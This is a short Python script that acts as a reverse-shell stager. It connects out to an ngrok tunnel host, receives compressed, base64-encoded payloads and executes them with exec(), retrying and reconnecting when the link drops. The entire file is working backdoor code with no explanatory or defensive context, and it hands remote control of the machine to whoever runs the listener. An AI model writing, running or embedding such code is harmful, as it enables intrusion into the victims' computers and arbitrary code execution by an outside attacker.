import socket,zlib,base64,struct,time
s=socket.socket(2,socket.SOCK_STREAM)

host = "2.tcp.eu.ngrok.io:11843";
for x in range(10):
    try:
        
        s.connect((host.split(":")[0],int(host.split(":")[1])))
        print("Connected")
        break
    except Exception as e:
        print(e)
        time.sleep(5)
while True:
    try:
        l=struct.unpack('>I',s.recv(4))[0]
        d=s.recv(l)
        while len(d)<l:
            d+=s.recv(l-len(d))
        exec(zlib.decompress(base64.b64decode(d)),{'s':s})
    except KeyboardInterrupt:
        exit()
    except Exception as e:
        print("e2", str(e))
        if ("WinError 10057" in str(e)):
            print("e2 check true")
            while True:
                try:
                    s.connect((host.split(":")[0],int(host.split(":")[1])))
                    print("Connected")
                    break
                except Exception as e:
                    print("e3", e)
                    time.sleep(5)
            continue
        print("e2 check false")
